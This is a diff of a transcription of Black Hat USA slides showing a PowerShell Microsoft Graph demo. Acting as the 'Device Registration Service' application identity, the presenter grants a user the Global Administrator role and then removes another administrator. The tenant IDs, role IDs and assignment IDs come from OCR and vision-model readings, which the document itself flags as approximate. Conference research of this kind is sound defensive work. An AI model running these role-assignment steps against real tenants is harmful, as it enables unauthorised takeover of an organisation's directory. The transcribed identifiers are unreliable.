+-----------        --                                   ----                                            -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...
+
+PS C:\temp> Get-MGUser -UserId megan.bowen@northwindtraders.cloud
+
+DisplayName Id                                   Mail                               UserPrincipalName
+----------- --                                   ----                               -----------------
+Megan Bowen 936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud megan.bowen@northwindtraders.cloud
+
 PS C:\temp> $params = @{
 >> "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
 >> roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
->> principalId = "518e'7196-367f-436b-83c7-764cca0a688c"
->> directoryScopeld = "/"
+>> principalId = "518e7196-367f-436b-83c7-764cca0a688c"
+>> directoryScopeId = "/"
 >> }
 PS C:\temp>
-- : , ; ‘ a-% F #BHUSA @BlackHatEvents
 ```
 
 ## Slide 99
 
 **#BHUSA @BlackHatEvents** Looking up a target user that we will attempt to add to Global Administrator
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x ap) Sd
-Directory Synchronization Accounts b077747c-3953-408b-91F2-d6b58Fddadbec
-Attribute Definition Administrator b8508655-1331-4183-95ba—90a39d67e5ae
-Application Administrator d383ec2f-—f9ca—4e36—-8230-225832c0c361
-Conditional Access Administrator dbdf8b40-4757-4900-8676-7f2a81c9a294
-PS C:\temp> Get-MgDirectoryRoleMember —DirectoryRolelId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r -UserId $_.Id}
-DispLayName Id Mail
-Eric Woodruff
-Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935blad80
-PS
-C:\temp> |Get-MGUser -UserId megan.bowen@northwindtraders.cloud
-DispLlayName Id Mail UserPrincipalName
-Megan Bowen |936d55ce-a9b6—4a3b-—bala—76340951d486| megan. bowen@northwindtraders.cloud megan. bowen@northwindtraders.cloud
-PS
->>
->>
->>
->>
->>
-PS
-C:\temp> $params = @{
-"@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
-roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
-principalId = "518e7196-367f-436b-83c7-764cca0a688c"
-directoryScopelId = "/"
-}
-C:\temp>
-UserPrincipalNam
-d7148226-7444-4884—-aef7—b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com ga-eric@north...
-ga-ericw@nort...
-Looking up a target user that we-will attempt to add to Global Administrator
-#BHUSA
-@BlackHatEvents
+Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
+Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
+Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
+Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                            UserPrincipalName
+-----------        --                                   ----                                            -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...
+
+PS C:\temp> Get-MGUser -UserId megan.bowen@northwindtraders.cloud
+
+DisplayName Id                                   Mail                               UserPrincipalName
+----------- --                                   ----                               -----------------
+Megan Bowen 936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud megan.bowen@northwindtraders.cloud
+
+PS C:\temp> $params = @{
+>> "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
+>> roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
+>> principalId = "518e7196-367f-436b-83c7-764cca0a688c"
+>> directoryScopeId = "/"
+>> }
+PS C:\temp>
+
+Looking up a target user that we will attempt to add to Global Administrator
 ```
 
 ## Slide 100
 
 **#BHUSA @BlackHatEvents** Splatting the Global Admin role definition ID and Megans object ID in a hash table to pass to our next command
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x Sp | Ses = Oo x
-Directory Synchronization Accounts b077747c-3953-408b-91F2-d6b58Fddadbec
-Attribute Definition Administrator b8508655-1331-4183-95ba—90a39d67e5ae
-Application Administrator d383ec2f-—f9ca—4e36—-8230-225832c0c361
-Conditional Access Administrator dbdf8b40-4757-4900-8676-7f2a81c9a294
-PS C:\temp> Get-MgDirectoryRoleMember —DirectoryRolelId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r —-UserId $_.Id}
-DispLayName Id Mail UserPrincipalNam
-e
-Eric Woodruff d7148226-7444-4884—-aef7—b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com ga-eric@north...
-Eric Woodruff (GA) 73'7e7448-93c6-4677-b697-244935blad80 ga-ericw@nort...
-PS C:\temp> Get-MGUser —UserId megan. bowen@northwindtraders.cloud
-DispLlayName Id Mail UserPrincipalName
-Megan Bowen 936d55ce-a9b6—4a3b-—bala—76340951d486 megan.bowen@northwindtraders.cloud megan. bowen@northwindtraders.cloud
->>|"@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
->>|roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
->>|principalId = "518e'7196-367f-436b-83c7-764cca0a688c"
->>|directoryScopeld = "/"
+Directory Synchronization Accounts         b077747c-3953-408b-91f2-d6b58fdda0bc
+Attribute Definition Administrator         b8508655-1331-4183-95ba-90a39d67e5ae
+Application Administrator                  d383ec2f-f9ca-4e36-8230-225832c0c361
+Conditional Access Administrator           dbdf8b40-4757-4900-8676-7f2a81c9a294
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                            UserPrincipalName
+-----------        --                                   ----                                            -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...
+
+PS C:\temp> Get-MGUser -UserId megan.bowen@northwindtraders.cloud
+
+DisplayName Id                                   Mail                               UserPrincipalName
+----------- --                                   ----                               -----------------
+Megan Bowen 936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud megan.bowen@northwindtraders.cloud
+
+PS C:\temp> $params = @{
+>> "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
+>> roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"
+>> principalId = "518e7196-367f-436b-83c7-764cca0a688c"
+>> directoryScopeId = "/"
 >> }
 PS C:\temp>
-Splatting the Global Admin role definition ID and Megans object ID in a hash table to pass to our next command j #BHUSA @BlackHatEvents
+
+Splatting the Global Admin role definition ID and Megans object ID in a hash table to pass to our next command
 ```
 
 ## Slide 101
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x + |» = Oo x
@@ -2362,25 +2333,21 @@ TenantId : a8c79a2a—F998-4913-96d2-F45694b77bel
 Scopes x
 AuthType : AppOnly
 TokenCredentialType : ClientSecret
-CertificateThumbprint :
 CertificateSubjectName : =" :
 Account : as
 =| AppName : Device Registration Service
 =| ContextScope : Process
-= | Certificate : :
 ~~~} PSHostVersion > 5.1.22621.2506 =
-ManagedIdentityId : ——_
 ClientSecret : System.Security.SecureString eee
 Environment : Global meee
-PS C:\temp>
-> : ; ‘ . i #BHUSA @BlackHatEvents
 ```
 
 ## Slide 102
 
 **#BHUSA @BlackHatEvents** Assigning Megan the Global Administrator role
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell x + |» = Oo x
@@ -2393,17 +2360,13 @@ TenantId : a8c79a2a—F998-4913-96d2-F45694b77bel
 Scopes x
 AuthType : AppOnly
 TokenCredentialType : ClientSecret
-CertificateThumbprint :
 CertificateSubjectName : =" :
 Account : as
 =| AppName : Device Registration Service
 =| ContextScope : Process
-= | Certificate : :
 ~~~} PSHostVersion > 5.1.22621.2506 =
-ManagedIdentityId : ——_
 ClientSecret : System.Security.SecureString eee
 Environment : Global meee
-PS C:\temp>
 Assigning Megan the Global Administrator role : ‘ P #BHUSA @BlackHatEvents
 ```
 
@@ -2415,14 +2378,14 @@ The command worked, result output
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 BY Windows PowerShell
 >> }
 PS C:\temp> New-MgRoleManagementDirectoryRoleAssignment —BodyParameter $params No 403 response!
 Id
-PrincipallId
 RoleDefinitionId
 PS C:\temp> Get-MgContext
 ClientId
@@ -2440,9 +2403,7 @@ PSHostVersion
 ManagedIdentityId
 ClientSecret
 Environment
-PS C:\temp>
 : 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
-: a8c79a2a-—F998-4913-96d2-F45694b77bel
 : AppOnly
 : ClientSecret
 : Device Registration Service
@@ -2467,165 +2428,108 @@ Verifying we are still acting as Device Registration Service and still have no s
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell
-ClientId
-TenantId
-Scopes
-AuthType
-TokenCredentialType
-CertificateThumbprint
-CertificateSubjectName :
-Account
-AppName
-ContextScope
-Certificate
-PSHostVersion
-ManagedIdentityId
-ClientSecret
-Environment
-: 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
-: a8c79a2a-—F998-4913-96d2-F45694b77bel
-: AppOnly
-: ClientSecret
-: Device Registration Service
-: Process
-: 5.1.22621.2506
-: System.Security.SecureString
-: Global
-PS C:\temp> Get-MgDirectoryRoleMember —DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUse —
-sr —UserId $_.Id}
-DispLayName Id Mail UserPrincipalNam |
-= 2
-Eric Woodruff d7148226-7444-4884—-aef7—b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com ga-eric@north...
-Megan Bowen 936d55ce-a9b6—4a3b-—bala—76340951d486 megan. bowen@northwindtraders.cloud megan.bowen@n...
-Eric Woodruff (GA) 73'7e7448-93c6-4677-b697-244935blad80 ga-ericw@nort...
-PS C:\temp> ;
-> : ; ‘ . i #BHUSA @BlackHatEvents
+ClientId                : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+TenantId                : a8c79a2a-f998-4913-96d2-f45694b77be1
+Scopes                  :
+AuthType                : AppOnly
+TokenCredentialType     : ClientSecret
+CertificateThumbprint   :
+CertificateSubjectName  :
+Account                 :
+AppName                 : Device Registration Service
+ContextScope            : Process
+Certificate             :
+PSHostVersion           : 5.1.22621.2506
+ManagedIdentityId       :
+ClientSecret            : System.Security.SecureString
+Environment             : Global
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                            UserPrincipalName
+-----------        --                                   ----                                            -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
+Megan Bowen        936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@n...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...
+
+PS C:\temp>
 ```
 
 ## Slide 106
 
 **#BHUSA @BlackHatEvents** Gathering our Global Administrator role members, with Megan Bowen now added
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell
-ClientId
-TenantId
-Scopes
-AuthType
-TokenCredentialType
-CertificateThumbprint
-CertificateSubjectName :
-Account
-AppName
-ContextScope
-Certificate
-PSHostVersion
-ManagedIdentityId
-ClientSecret
-Environment
-: 01cb2876-7ebd—4aa4—9cc9-d28bd4d359a9
-: a8c79a2a-—F998-4913-96d2-F45694b77bel
-: AppOnly
-: ClientSecret
-: Device Registration Service
-: Process
-: 5.1.22621.2506
-: System.Security.SecureString
-: Global
+ClientId                : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
+TenantId                : a8c79a2a-f998-4913-96d2-f45694b77be1
+Scopes                  :
+AuthType                : AppOnly
+TokenCredentialType     : ClientSecret
+CertificateThumbprint   :
+CertificateSubjectName  :
+Account                 :
+AppName                 : Device Registration Service
+ContextScope            : Process
+Certificate             :
+PSHostVersion           : 5.1.22621.2506
+ManagedIdentityId       :
+ClientSecret            : System.Security.SecureString
+Environment             : Global
+
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName        Id                                   Mail                                            UserPrincipalName
+-----------        --                                   ----                                            -----------------
+Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@north...
+Megan Bowen        936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@n...
+Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                  ga-ericw@nort...
+
 PS C:\temp>
-Get-MgDirectoryRoleMember —DirectoryRolelId ae81c4d9-3b45-445b-896a-64aa7085db93
-| ForEach-Object { Get-MGUse ——-
-mr —UserId $_.Id}
-ispLayName Id
-ric Woodruff
-egan Bowen
-d7148226-7444-4884—-aef7—b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com ga-eric@north...
-936d55ce-a9b6—4a3b-—bala—76340951d486 megan. bowen@northwindtraders.cloud
-ric Woodruff (GA) 737e7448-93c6-4677-b697-244935blad80
-Mail UserPrincipalNam |
-S
-megan.bowen@n...
-ga-ericw@nort...
-PS C:\temp>
+
 Gathering our Global Administrator role members, with Megan Bowen now added
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 107
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 54/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + |v
-LAPpYvVpNOKRKAEhdxReEEhOfnPGk3dGtpckSTWxrYA-1
-LAPpYvVpNOKRkAEhdxReEM5VbZ02qTtKuhp2NALR1IIY-1
-LAPpYvVpNOKRKAEhdxReECaCFNdEdIRIrvel_mk6Z5g-1
-LAPpYvVpNOKRkAEhdxReEN21PuDWLchFroZPpvA441A-1
-4—-PYiFWPHkqVOpuYmLiHa4_jmSP4HHOdAKHnE1Ete6LI-1
-4—-PYiFWPHkqVOpuYmLiHa2n-d5cDm2LCi4z6RgOKnUk-1
-BSubO0kaAukSHWB4mGC_PMszL8xvOpXREoMy j paC6uMU-1
-BSubO0kaAukSHWB4mGC_PML9F7LxUaptNuRB5u7pzZQ4-1
-LJnv8vs6uUa3z6Em7nTEUfTaHhBFa3pMhDM_tpKeOnM-1
-LUJnv8vs6uUa3z6Em7nTEUckh2rvrn5lGndXWsugf6_I-1
-5wuT_mJe20eRr5jDpJo4sfTaHhBFa3pMhDM_tpKeOnM-1
-Phy-sV22GU-EJ_b6DZ-ufTaHhBFa3pMhDM_tpKeOnM-1
-OgJe1hQCdEaOXXZvszDiwH9_a7vXTtZFpzUszwvtrdQ-1
-NIwd6_WsDUaEJMHxpvvbhx9_a7vXTtZFpzUszwvtrdQ-1
-k1L2Jm9MsxOSdAqasLV6lLw8ibNpOFDYNPkKJYhE-uX29U-1
-8MYkhImhnkm70CbBdTyW1CaCFNdEdIRIrvel_mk6Z5g-1
-PS C:\temp> Remove—MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId LAPpYvVpNOKRkAEhdxReEEhOfnPGk3dGtpck aoe
-= STWxrYA-1
-737e7448-93c6-4677—-b697-244935blad80
-936d55ce-a9b6—4a3b-—bala-76340951d486
-d7148226-7444-U884—aef7—-b5fe693a6798
-e03eb5dd-2dd6-45c8-ae86—-U4F a6F038e350
-2399e38f-1cf8-40e7-9079-cUd44b5ee8b2
-9777£e69-9b03-4269-8b8c-Ffal6038a9d49
-1bf3cbec—a5ce—-4474-a0cc—a3a5a0bab8c5
-5cee5f5f-6a54—U4d9b-b910-79bbba73650e
-101ledaf4—6b45—-4c7a—-8433-3Fb6929e3a73
-bbda21c9-9feb-4699-9dd5-d6b2e81febf2
-101ledaf4—-6b45-—4c7a-8433-3Fb6929e3a73
-101ledaf4—-6b45-4c7a-8433-3Fb6929e3a73
-bb6b7#7£—4ed7-45d6-a735-2ccfObedadd4
-bb6b7£7£-4ed7—-45d6-a735-2ccfObedadd4
-9d369bc8-0d05-4F83-9096-2113eb97dbd5
-d7148226-7444-U4884—aef7-—b5£e693a6798
-62e90394-69F5-4237-9190-012177145e10
-62e90394-69F5-4237-9190-012177145e10
-62e90394-69F5-4237-9190-012177145e10
-62e90394-69F5-4237-9190-012177145e10
-88d8e3e3-8f55-Uale—953a-9b9898b8876b
-88d8e3e3-8f55—-Uale—-953a-9b9898b8876b
-d29b2b05-8046-44ba-8758-1e26182Fcf32
-d29b2b05-8046-44ba-8758-1e26182Fcf32
-£2ef992c-3afb-46b9-b7cf-al26ee74c451
-f2ef992c-3afb-46b9-b7cf-al26ee74c451
-£e930be7-5e62-47db-91af-98c3a49a38b1
-blbelc3e-b65d-419-8427-f6fa0d97Feb9
-d65e02d2-0214-4674-8e5d-766Fb330e2c0
-eb1d8c34—-acf5-460d-8424-cl1fla6fbdb85
-9b895d92-2cd3-4Uc7-9d02-a6ac2d5ea5c3
-8424c6f0-a189-499e—bbd0-26c1753c96d4
-PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r -UserId $_.Id}
-; DisplayName Id
-Megan Bowen
+lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1 737e7448-93c6-4677-b697-244935b1ad80 62e90394-69f5-4237-9190-012177145e10
+lAPpYvVpN0KRkAEhdxReEM5VbZO2qTtKuhp2NAlR1IY-1 936d55ce-a9b6-4a3b-ba1a-76340951d486 62e90394-69f5-4237-9190-012177145e10
+lAPpYvVpN0KRkAEhdxReECaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 62e90394-69f5-4237-9190-012177145e10
+lAPpYvVpN0KRkAEhdxReEN21PuDWLchFroZPpvA441A-1 e03eb5dd-2dd6-45c8-ae86-4fa6f038e350 62e90394-69f5-4237-9190-012177145e10
+4-PYiFWPHkqVOpuYmLiHa4_jmSP4HOdAkHnE1Ete6LI-1 2399e38f-1cf8-40e7-9079-c4d44b5ee8b2 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
+4-PYiFWPHkqVOpuYmLiHa2n-d5cDm2lCi4z6RgOKnUk-1 9777fe69-9b03-4269-8b8c-fa46038a9d49 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
+BSub0kaAukSHWB4mGC_PMszL8xvOpXREoMyjpaC6uMU-1 1bf3cbcc-a5ce-4474-a0cc-a3a5a0bab8c5 d29b2b05-8046-44ba-8758-1e26182fcf32
+BSub0kaAukSHWB4mGC_PMl9f7lxUaptNuRB5u7pzZQ4-1 5cee5f5f-6a54-4d9b-b910-79bbba73650e d29b2b05-8046-44ba-8758-1e26182fcf32
+LJnv8vs6uUa3z6Em7nTEUfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 f2ef992c-3afb-46b9-b7cf-a126ee74c451
+LJnv8vs6uUa3z6Em7nTEUckh2rvrn5lGndXWsugf6_I-1 bbda21c9-9feb-4699-9dd5-d6b2e81febf2 f2ef992c-3afb-46b9-b7cf-a126ee74c451
+5wuT_mJe20eRr5jDpJo4sfTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 fe930be7-5e62-47db-91af-98c3a49a38b1
+Phy-sV22GU-EJ_b6DZf-ufTaHhBFa3pMhDM_tpKeOnM-1 101edaf4-6b45-4c7a-8433-3fb6929e3a73 b1be1c3e-b65d-4f19-8427-f6fa0d97feb9
+0gJe1hQCdEaOXXZvszDiwH9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 d65e02d2-0214-4674-8e5d-766fb330e2c0
+NIwd6_WsDUaEJMHxpvvbhX9_a7vXTtZFpzUszwvtrdQ-1 bb6b7f7f-4ed7-45d6-a735-2ccf0bedadd4 eb1d8c34-acf5-460d-8424-c1f1a6fbdb85
+kl2Jm9Msx0SdAqasLV6lw8ibNp0FDYNPkJYhE-uX29U-1 9d369bc8-0d05-4f83-9096-2113eb97dbd5 9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3
+8MYkhImhnkm70CbBdTyW1CaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 8424c6f0-a189-499e-bbd0-26c1753c96d4
+
+PS C:\temp> Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1
+PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}
+
+DisplayName   Id                                   Mail                                            UserPrincipalName
+-----------   --                                   ----                                            -----------------
+Eric Woodruff d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com  ga-eric@northwindt...
+Megan Bowen   936d55ce-a9b6-4a3b-ba1a-76340951d486 megan.bowen@northwindtraders.cloud              megan.bowen@northw...
+
 PS C:\temp>
-—— —
-Mail
-936d55ce-a9b6—4a3b-—bala-76340951d486 megan. bowen@northwindtraders.cloud
-UserPrincipalName —
-megan.bowen@northw...
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 108
@@ -2636,115 +2540,88 @@ megan.bowen@northw...
 
 **#BHUSA @BlackHatEvents** Gathering our Global Administrator role members, with a different Global Administrator now removed
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-BY Windows PowerShell x + |v
-LAPpYvVpNOKRKAEhdxReEEhOfnPGk3dGtpckSTWxrYA-1
-LAPpYvVpNOKRkAEhdxReEM5VbZ02qTtKuhp2NALR1IIY-1
-LAPpYvVpNOKRKAEhdxReECaCFNdEdIRIrvel_mk6Z5g-1
-LAPpYvVpNOKRkAEhdxReEN21PuDWLchFroZPpvA441A-1
-4—-PYiFWPHkqVOpuYmLiHa4_jmSP4HHOdAKHnE1Ete6LI-1
-4—-PYiFWPHkqVOpuYmLiHa2n-d5cDm2LCi4z6RgOKnUk-1
-BSubO0kaAukSHWB4mGC_PMszL8xvOpXREoMy j paC6uMU-1
-BSubO0kaAukSHWB4mGC_PML9F7LxUaptNuRB5u7pzZQ4-1
-LJnv8vs6uUa3z6Em7nTEUfTaHhBFa3pMhDM_tpKeOnM-1
-LUJnv8vs6uUa3z6Em7nTEUckh2rvrn5lGndXWsugf6_I-1
-5wuT_mJe20eRr5jDpJo4sfTaHhBFa3pMhDM_tpKeOnM-1
-Phy-sV22GU-EJ_b6DZ-ufTaHhBFa3pMhDM_tpKeOnM-1
-OgJe1hQCdEaOXXZvszDiwH9_a7vXTtZFpzUszwvtrdQ-1
-NIwd6_WsDUaEJMHxpvvbhx9_a7vXTtZFpzUszwvtrdQ-1
-k1L2Jm9MsxOSdAqasLV6lLw8ibNpOFDYNPkKJYhE-uX29U-1
-8MYkhImhnkm70CbBdTyW1CaCFNdEdIRIrvel_mk6Z5g-1
-PS C:\temp> Remove—MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId LAPpYvVpNOKRkAEhdxReEEhOfnPGk3dGtpck aoe
-= STWxrYA-1
-737e7448-93c6-4677—-b697-244935blad80
-936d55ce-a9b6—4a3b-—bala-76340951d486
-d7148226-7444-U884—aef7—-b5fe693a6798
-e03eb5dd-2dd6-45c8-ae86—-U4F a6F038e350
-2399e38f-1cf8-40e7-9079-cUd44b5ee8b2
-9777£e69-9b03-4269-8b8c-Ffal6038a9d49
-1bf3cbec—a5ce—-4474-a0cc—a3a5a0bab8c5
-5cee5f5f-6a54—U4d9b-b910-79bbba73650e
-101ledaf4—6b45—-4c7a—-8433-3Fb6929e3a73
-bbda21c9-9feb-4699-9dd5-d6b2e81febf2
-101ledaf4—-6b45-—4c7a-8433-3Fb6929e3a73
-101ledaf4—-6b45-4c7a-8433-3Fb6929e3a73
-bb6b7#7£—4ed7-45d6-a735-2ccfObedadd4
-bb6b7£7£-4ed7—-45d6-a735-2ccfObedadd4
-9d369bc8-0d05-4F83-9096-2113eb97dbd5
-d7148226-7444-U4884—aef7-—b5£e693a6798
-62e90394-69F5-4237-9190-012177145e10
-62e90394-69F5-4237-9190-012177145e10
-62e90394-69F5-4237-9190-012177145e10
-62e90394-69F5-4237-9190-012177145e10
-88d8e3e3-8f55-Uale—953a-9b9898b8876b
-88d8e3e3-8f55—-Uale—-953a-9b9898b8876b
-d29b2b05-8046-44ba-8758-1e26182Fcf32
-d29b2b05-8046-44ba-8758-1e26182Fcf32
-£2ef992c-3afb-46b9-b7cf-al26ee74c451
-f2ef992c-3afb-46b9-b7cf-al26ee74c451
-£e930be7-5e62-47db-91af-98c3a49a38b1
-blbelc3e-b65d-419-8427-f6fa0d97Feb9
-d65e02d2-0214-4674-8e5d-766Fb330e2c0
-eb1d8c34—-acf5-460d-8424-cl1fla6fbdb85
-9b895d92-2cd3-4Uc7-9d02-a6ac2d5ea5c3
-8424c6f0-a189-499e—bbd0-26c1753c96d4
-PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUse
-r -UserId $_.Id}
-isplayName Id
-egan Bowen
-Mail
-936d55ce-a9b6—4a3b-—bala-76340951d486 megan. bowen@northwindtraders.cloud
-UserPrincipalName —
-megan.bowen@northw...
+lAPpYvVpN0KRkAEhdxReEEh0fnPGk3dGtpckSTWxrYA-1 737e7448-93c6-4677-b697-244935b1ad80 62e90394-69f5-4237-9190-012177145e10
+lAPpYvVpN0KRkAEhdxReEM5VbZO2qTtKuhp2NAlR1IY-1 936d55ce-a9b6-4a3b-ba1a-76340951d486 62e90394-69f5-4237-9190-012177145e10
+lAPpYvVpN0KRkAEhdxReECaCFNdEdIRIrve1_mk6Z5g-1 d7148226-7444-4884-aef7-b5fe693a6798 62e90394-69f5-4237-9190-012177145e10
+lAPpYvVpN0KRkAEhdxReEN21PuDWLchFroZPpvA441A-1 e03eb5dd-2dd6-45c8-ae86-4fa6f038e350 62e90394-69f5-4237-9190-012177145e10
+4-PYiFWPHkqVOpuYmLiHa4_jmSP4HOdAkHnE1Ete6LI-1 2399e38f-1cf8-40e7-9079-c4d44b5ee8b2 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
+4-PYiFWPHkqVOpuYmLiHa2n-d5cDm2lCi4z6RgOKnUk-1 9777fe69-9b03-4269-8b8c-fa46038a9d49 88d8e3e3-8f55-4a1e-953a-9b9898b8876b
+BSub0kaAukSHWB4mGC_PMszL8xvOpXREoMyjpaC6uMU-1 1bf3cbcc-a5ce-4474-a0cc-a3a5a0bab8c5 d29b2b05-8046-44ba-8758-1e26182fcf32
